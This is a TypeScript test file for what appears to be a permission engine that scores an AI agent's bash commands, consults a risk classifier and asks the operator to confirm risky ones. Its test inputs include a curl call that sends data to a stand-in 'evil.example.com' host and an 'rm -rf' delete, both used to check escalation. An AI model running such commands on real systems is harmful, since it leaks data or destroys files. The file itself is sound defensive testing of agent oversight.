    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
      classifier: () => null,
    });
    eng.check('bash', 'bash', { command: 'ls -la' });
    expect(eng.state()).toBe('ready');
    expect(collected[0]?.classifier_adjust).toBeNull();
    const stages = collected[0]?.reason_chain.map((e) => e.stage) ?? [];
    expect(stages).toContain('classifier-unavailable');
  });

  test('classifier throws → classifier-unavailable + lenient continues', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
      classifier: () => {
        throw new Error('inference timeout');
      },
    });
    expect(() => eng.check('bash', 'bash', { command: 'ls -la' })).not.toThrow();
    expect(eng.state()).toBe('ready');
    const stages = collected[0]?.reason_chain.map((e) => e.stage) ?? [];
    expect(stages).toContain('classifier-unavailable');
    const entry = collected[0]?.reason_chain.find((e) => e.stage === 'classifier-unavailable');
    expect(entry?.note).toContain('inference timeout');
  });

  test('classifier with malformed output → classifier-unavailable', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
      // biome-ignore lint/suspicious/noExplicitAny: deliberately wrong shape
      classifier: () => ({ wrong_field: 0.1 }) as any,
    });
    eng.check('bash', 'bash', { command: 'ls -la' });
    const stages = collected[0]?.reason_chain.map((e) => e.stage) ?? [];
    expect(stages).toContain('classifier-unavailable');
  });

  test('strict mode: unavailable classifier degrades engine', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
      classifier: () => null,
      classifierRequired: true,
    });
    expect(eng.state()).toBe('ready');
    eng.check('bash', 'bash', { command: 'ls -la' });
    expect(eng.state()).toBe('degraded');
  });

  test('no classifier wired → classifier_hash="none", classifier_adjust=null', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
    });
    eng.check('bash', 'bash', { command: 'ls -la' });
    expect(collected[0]?.classifier_hash).toBe('none');
    expect(collected[0]?.classifier_adjust).toBeNull();
  });

  test('misc category skips classifier entirely', () => {
    const collected: CapturedEmit[] = [];
    let consultCount = 0;
    const eng = createPermissionEngine(policy({}), {
      cwd: PROJ,
      home: HOME,
      audit: captureSink(collected),
      classifier: () => {
        consultCount += 1;
        return { score_adjust: 0.1, reason: 'hello' };
      },
    });
    eng.check('todo_write', 'misc', {});
    expect(consultCount).toBe(0);
    expect(collected[0]?.classifier_adjust).toBeNull();
  });

  test('classifier input shape excludes raw args / command fields', () => {
    // The classifier sees curated fields only — capability STRINGS
    // (derived from resolvers, which may carry path/host scope),
    // the score, the tool name, the hash. The shape does NOT have
    // a top-level `args` or `command` key; raw args never flow in
    // as a model-controlled field. (Capability scope CAN reflect
    // a path the resolver derived from args; that's the point of
    // resolution — the classifier needs to know what'll be
    // touched.)
    let seen: unknown = null;
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['*'] } } }), {
      cwd: PROJ,
      home: HOME,
      classifier: (input) => {
        seen = input;
        return null;
      },
    });
    eng.check('bash', 'bash', { command: 'ls -la' });
    const keys = Object.keys(seen as Record<string, unknown>).sort();
    expect(keys).toEqual(['capabilities', 'classifierHash', 'score', 'toolName']);
    // Belt-and-braces: explicitly check no raw-arg / command field.
    expect((seen as Record<string, unknown>).args).toBeUndefined();
    expect((seen as Record<string, unknown>).command).toBeUndefined();
  });
});

describe('engine — approval gate consumes score (§6.6, slice 7)', () => {
  const PROJ = '/work/proj';

  interface CapturedEmit {
    decision: 'allow' | 'deny' | 'confirm';
    score?: number;
    reason_chain: ReadonlyArray<{ stage: string; note?: string }>;
  }

  const captureSink = (collected: CapturedEmit[]) => ({
    emit(input: CapturedEmit) {
      collected.push(input);
      return { seq: collected.length, this_hash: `fake-${collected.length}` };
    },
    verifyChain() {
      return { ok: true as const, rows: collected.length };
    },
  });

  // Score-0 / high-confidence baseline: passes through as allow when
  // the policy admits the command. Sanity check that the §6.6 gate
  // doesn't fire on the safe-by-default path.
  test('allow + high-confidence + score < 0.4 → allow', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls*'] } } }), {
      cwd: PROJ,
    });
    const d = eng.check('bash', 'bash', { command: 'ls -la' });
    expect(d.kind).toBe('allow');
  });

  // `git commit` → resolver returns `git-write` capability with
  // high confidence; risk-score adds +0.40 for `capability_risk`
  // (git-write ∈ critical set). Final score is exactly 0.40 — the
  // boundary case for §6.6 ("score >= 0.4 → confirm").
  test('boundary: score exactly at threshold (0.4) → confirm', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git*'] } } }), {
      cwd: PROJ,
      audit: captureSink(collected),
    });
    const d = eng.check('bash', 'bash', { command: 'git commit -m msg' });
    expect(d.kind).toBe('confirm');
    expect(collected[0]?.score).toBeGreaterThanOrEqual(0.4);
  });

  // `rm -rf` triggers both capability_risk (delete-fs) and
  // blocklist_command (`rm -rf` substring) — score well above 0.4.
  test('score > threshold → confirm', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['rm*'] } } }), {
      cwd: PROJ,
    });
    const d = eng.check('bash', 'bash', { command: 'rm -rf /tmp/x' });
    expect(d.kind).toBe('confirm');
  });

  // §6.6 second disjunct: confidence != high forces confirm even
  // when the score itself is below the threshold. `npm test` lands
  // medium confidence via cmdPkgInstall in the slice 6 resolver.
  test('allow + medium confidence → confirm (regardless of score)', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['npm*'] } } }), {
      cwd: PROJ,
      audit: captureSink(collected),
    });
    const d = eng.check('bash', 'bash', { command: 'npm test' });
    expect(d.kind).toBe('confirm');
    // Score components include `confidence_medium` (+0.10) but the
    // gate firing is attributed to the confidence side of §6.6, not
    // the score side — the chain entry below pins that.
    const stages = collected[0]?.reason_chain.map((e) => e.stage) ?? [];
    expect(stages).toContain('approval-gate');
  });

  // Custom threshold knob — production tuning per §6.3.2 calibration.
  // Pushing the threshold to 1.0 effectively disables score-side
  // gating; the confidence side still fires for non-high resolvers.
  test('custom scoreConfirmThreshold respected (high value disables score-side gate)', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git*'] } } }), {
      cwd: PROJ,
      scoreConfirmThreshold: 1.0,
    });
    // git commit score = 0.4 ≪ 1.0; high confidence; no upgrade.
    const d = eng.check('bash', 'bash', { command: 'git commit -m msg' });
    expect(d.kind).toBe('allow');
  });

  // Symmetric direction: a very tight threshold escalates earlier.
  // `curl evil.example.com` carries `untrusted_egress` (+0.25);
  // baseline threshold 0.4 keeps it as allow, but threshold 0.2
  // gates it.
  test('custom scoreConfirmThreshold respected (low value escalates earlier)', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['curl*'] } } }), {
      cwd: PROJ,
      scoreConfirmThreshold: 0.2,
    });
    const d = eng.check('bash', 'bash', { command: 'curl https://evil.example.com/data' });
    expect(d.kind).toBe('confirm');
  });

  // bypass mode is an explicit operator override (defaults.mode='bypass'
  // in policy) — every decision returns allow regardless of score.
  // The score-gate must NOT undo the bypass shortcut.
  test('bypass mode skips score-gating', () => {
    const eng = createPermissionEngine(policy({ defaults: { mode: 'bypass' }, tools: {} }), {
      cwd: PROJ,
    });
    const d = eng.check('bash', 'bash', { command: 'rm -rf /tmp/x' });
    expect(d.kind).toBe('allow');
  });

  // Session-allow exempts a shape from BOTH the resolver-forced
  // upgrade (slice 3) and the score-gate (slice 7). Operator already
  // saw the modal once and explicitly trusted the literal pattern.
  test('session-allow exempts a shape from score-gating', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['rm*'] } } }), {
      cwd: PROJ,
    });
    eng.addSessionAllow('bash', 'rm -rf /tmp/x');
    const d = eng.check('bash', 'bash', { command: 'rm -rf /tmp/x' });
    expect(d.kind).toBe('allow');
    expect(d.source?.layer).toBe('session');
  });

  // Audit attribution: when the score is what forced the confirm,
  // the reason chain gains a stable `approval-gate` entry naming
  // the trigger (score or confidence side). Operators reading the
  // modal preview / `/perms why` see exactly which §6.6 rule fired.
  test('reason chain carries approval-gate stage when score forces confirm', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git*'] } } }), {
      cwd: PROJ,
      audit: captureSink(collected),
    });
    eng.check('bash', 'bash', { command: 'git commit -m msg' });
    const stages = collected[0]?.reason_chain.map((e) => e.stage) ?? [];
    expect(stages).toContain('approval-gate');
    const entry = collected[0]?.reason_chain.find((e) => e.stage === 'approval-gate');
    expect(entry?.note).toMatch(/^score=\d+\.\d{2} >= threshold=0\.40$/);
  });

  // Tail-stage attribution precedence: degraded > resolver-forced >
  // score-gate. When both degraded AND score-gate fire, the audit
  // row should attribute to engine-state (degraded), not
  // approval-gate. The decision is confirm either way; the
  // attribution chain tells the operator WHY.
  test('degraded state attribution wins over approval-gate', () => {
    const collected: CapturedEmit[] = [];
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git*'] } } }), {
      cwd: PROJ,
      audit: captureSink(collected),
      initialState: 'degraded',
    });
    eng.check('bash', 'bash', { command: 'git commit -m msg' });
    const stages = collected[0]?.reason_chain.map((e) => e.stage) ?? [];
    expect(stages).toContain('engine-state');
    expect(stages).not.toContain('approval-gate');
  });

  // Misc category short-circuits the resolver — score is 0 and the
  // approval-gate must not invent confidence data from the missing
  // resolver result. allow flows through unchanged.
  test('misc category bypasses score-gate cleanly', () => {
    const eng = createPermissionEngine(policy({}), { cwd: PROJ });
    const d = eng.check('mystery_misc_tool', 'misc', {});
    expect(d.kind).toBe('allow');
  });
});
